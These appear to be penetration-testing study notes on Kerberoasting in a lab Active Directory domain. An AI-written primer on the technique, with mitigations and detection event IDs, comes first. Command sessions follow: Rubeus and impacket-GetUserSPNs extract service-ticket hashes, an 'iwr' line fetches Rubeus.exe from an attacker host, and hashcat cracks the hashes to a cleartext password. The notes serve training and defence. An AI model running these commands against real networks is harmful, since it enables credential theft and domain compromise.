
## Targeted Kerberoasting Attack Primer:

- To perform this attack we need 1 of these rights over the user:
    - `WriteOwner`
    - `GenericAll`
    - `GenericWrite`
    - `WriteProperty`
    - `Validated-SPN`
    - `WriteProperties`

## notebooklm AI

A **Kerberoast attack** is a lateral movement and privilege escalation technique specifically targeting **Service Principal Name (SPN) accounts** within Active Directory (AD) environments. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Often, domain accounts are employed to run services, making them potential targets.

**How it Works** The core mechanism involves an attacker, as any domain user, requesting a Kerberos ticket for a service account. This is also possible across **forest trusts** if authentication is permitted. The primary objective is to obtain a **Ticket Granting Service (TGS) ticket** for a service account, which can then be cracked offline to reveal the account's **cleartext password**. If the cracked password belongs to a user with administrative privileges, this can lead to significantly expanded access or even full domain compromise.

**Key Characteristics and Concepts**

- **Target:** The attack specifically targets service accounts configured with SPNs.
- **Outcome:** It serves as a method for lateral movement and privilege escalation within a domain.
- **Offline Cracking:** The TGS tickets are typically obtained as **RC4-encrypted hashes** (type 23) or, less commonly, AES-encrypted hashes (type 18), which are then subjected to offline cracking using tools like Hashcat or John the Ripper. RC4 hashes are generally weaker and quicker to crack than AES hashes.
- **Prerequisites:** An attacker needs valid domain user credentials (cleartext password or NTLM hash, especially for Impacket tools) or a shell in the context of a domain user. The IP address of a Domain Controller is also necessary to query for SPNs.
- **Targeted Kerberoasting:** If an attacker has `GenericWrite` or `GenericAll` Access Control Entry (ACE) rights over a user object, they can manipulate the `servicePrincipalName` attribute to create a fake SPN, request a TGS ticket for it, and then potentially revert the modification, allowing them to crack the password.

**Tools and Methods** Kerberoasting can be executed from both Linux and Windows attack hosts:

- **Linux Tools:**
    
    - **Impacket's `GetUserSPNs.py`**: This tool is widely used from non-domain joined Linux hosts. It requires domain user credentials and a Domain Controller's IP to gather SPN listings and request TGS tickets in a format suitable for offline cracking.
    - **`ticketer.py`**: Part of the Impacket toolkit, it is used for creating and customizing Kerberos Ticket Granting Tickets (TGT) and TGS tickets.
- **Windows Tools:**
    
    - **Rubeus (from GhostPack)**: A highly automated and efficient tool for Kerberoasting. It offers various options, including filtering for accounts with `admincount=1` (indicating privileged accounts), specifying different encryption types, and exporting hashes directly. The `/tgtdeleg` flag can be particularly useful on older Domain Controllers (Windows Server 2016 and earlier) to force the request of RC4-encrypted tickets, which are faster to crack, even if the account supports stronger AES encryption.
    - **PowerView**: This PowerShell tool can enumerate SPN accounts, extract TGS tickets, and convert them into Hashcat-compatible formats.
    - **`setspn.exe` (Built-in Binary)**: Used in more manual attack chains, often in conjunction with PowerShell and Mimikatz, to enumerate SPNs in a domain.
    - **Mimikatz**: Can extract Kerberos tickets from memory, either as `.kirbi` files or base64-encoded blobs, for subsequent offline cracking.

**Efficacy and Risk** The effectiveness of a Kerberoast attack is directly linked to the **strength of the service account's password**. Weak or common passwords can be cracked rapidly, potentially leading to significant access. Conversely, strong, complex passwords make offline cracking difficult or impossible within reasonable timeframes. Attackers like Tim Medin have discussed this attack in detail, emphasizing these aspects. Kerberoasting is classified under the MITRE ATT&CK framework as **TA0006 Credential Access**, specifically technique **T1558 Steal or Forge Kerberos Tickets**, and sub-technique **T1558.003 Kerberoasting**.

**Mitigation and Detection** Organizations can implement various measures to mitigate and detect Kerberoasting attacks:

- **Mitigation Strategies:**
    
    - **Strong Password Policies:** Enforce the use of long and complex passwords or passphrases for service accounts that are not easily found in wordlists.
    - **Stronger Encryption:** Prioritize and enforce the use of stronger encryption schemes (like AES) for Kerberos authentication over RC4, and restrict the use of the RC4 algorithm for service accounts where possible.
    - **Managed Service Accounts (MSA) and Group Managed Service Accounts (gMSA):** These accounts utilize highly complex, automatically rotating passwords, which significantly reduces the risk of successful Kerberoasting.
    - **Limit Privileged SPN Accounts:** Avoid using highly privileged accounts, such as Domain Admins, as SPN accounts.
    - **Regular Audits:** Periodically audit user account permissions for excessive group memberships that might create attack paths.
- **Detection Strategies:**
    
    - **Monitor TGS Requests:** Look for an unusually high number of Kerberos TGS-REQ and TGS-REP requests, which can indicate automated Kerberoasting tools at work.
    - **Event Logging:** Configure Domain Controllers to log Kerberos TGS ticket operations by enabling "Audit Kerberos Service Ticket Operations" in Group Policy. Monitor for Event IDs **4769 (a Kerberos service ticket was requested)** and **4770 (a Kerberos service ticket was renewed)**. A large volume of Event ID 4769 from a single account within a short period is a strong indicator of an attack.
    - **Identify Encryption Type:** When monitoring logs, note the encryption type used in ticket requests (e.g., `0x17` for RC4), as this indicates a weaker encryption that could be more easily cracked.
## Rubeus
Machine location
```
┌──(kali㉿kali)-[~/tools/Ghostpack-CompiledBinaries]
└─$ pwd                      
/home/kali/tools/Ghostpack-CompiledBinaries
                                                                                                                    
┌──(kali㉿kali)-[~/tools/Ghostpack-CompiledBinaries]
└─$ ls -lh
total 2.9M
-rw-rw-r-- 1 kali kali 170K Sep 23 17:45  Certify.exe
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v3.5 compiled binaries'
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v4.5 compiled binaries'
drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v4.7.2 compiled binaries'
-rw-rw-r-- 1 kali kali  33K Sep 23 17:45  Koh.exe
-rw-rw-r-- 1 kali kali  15K Sep 23 17:45  LockLess.exe
-rw-rw-r-- 1 kali kali  246 Sep 23 17:45  README.md
-rw-rw-r-- 1 kali kali 8.0K Sep 23 17:45  RestrictedAdmin.exe
-rw-rw-r-- 1 kali kali 437K Sep 23 17:45  Rubeus.exe
-rw-rw-r-- 1 kali kali 714K Sep 23 17:45  SafetyKatz.exe
-rw-rw-r-- 1 kali kali 583K Sep 23 17:45  Seatbelt.exe
-rw-rw-r-- 1 kali kali 723K Sep 23 17:45  SharpChrome.exe
-rw-rw-r-- 1 kali kali 127K Sep 23 17:45  SharpDPAPI.exe
-rw-rw-r-- 1 kali kali 8.5K Sep 23 17:45  SharpDump.exe
-rw-rw-r-- 1 kali kali  15K Sep 23 17:45  SharpRoast.exe
-rw-rw-r-- 1 kali kali  39K Sep 23 17:45  SharpUp.exe
-rw-rw-r-- 1 kali kali  53K Sep 23 17:45  SharpWMI.exe
```

Run it 
Utilizing Rubeus to perform a Kerberoast attack
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```


```
iwr -uri http://192.168.45.175/Rubeus.exe -Outfile Rubeus.exe
```


Reviewing the correct Hashcat mode
```
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

Cracking the TGS-REP hash
```
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
```

Using impacket-GetUserSPNs to perform Kerberoasting on Linux
```
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```

Cracking the TGS-REP hash
```
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec
...
a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba565aa97941ccfd634b:Strawberry1
```